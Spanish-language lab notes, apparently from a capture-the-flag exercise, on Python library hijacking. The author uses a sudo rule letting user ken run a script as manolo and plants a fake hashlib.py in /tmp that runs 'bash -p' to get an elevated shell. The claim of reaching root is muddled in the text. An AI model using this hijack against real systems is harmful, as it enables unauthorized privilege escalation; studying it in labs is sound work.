
En este caso podemos ver que podemos ejecutar desde el usuario ken como usuario manolo el script example.py

`sudo -l`
![[Pasted image 20250419232159.png]]

Accedemos al user manolo
Nos vamos a `/tmp/` y hacemos `nano example.py`
ingresamos el siguiente codigo:
`import hashlib`

`if __name__ == '__main__':`
        `cadena = "Hola esta es mi cadena"`
        `print(hashlib.md5(cadena.encode()).hexdigest())`


Desde el usuario ken podemos observar el `example.py`
que podemos ejecutar desde nuestro usuario ken pero como manolo de la siguiente forma:

sudo -u manolo python3 /tmp/example.py

observamos que emplea la libreria hashlib entonces lo que hacemos es localizar en que ruta se encuentr exactamente

`apt install locate`
locate hashlib

lo que hacemos es crear en tmp un archivp hashlib.py para secuestrarlo


		nano hashlib.py
			import os
			os.system("bash -p")



![[Pasted image 20250419234151.png]]
y POWNED!!!!
Hemos brincado a root con library hijacking

![[Pasted image 20250419234247.png]]
Estamos como maonolo pero root
EN CASO DE QUE PODAMOS ACCEDER A LA LIBRERIA Y MODIFICARLA PODEMOS AGREGAR UN BASH -P DENTRO DE LA LIBRERIA (SOLO SI NOS PERMITE EDITARLO)
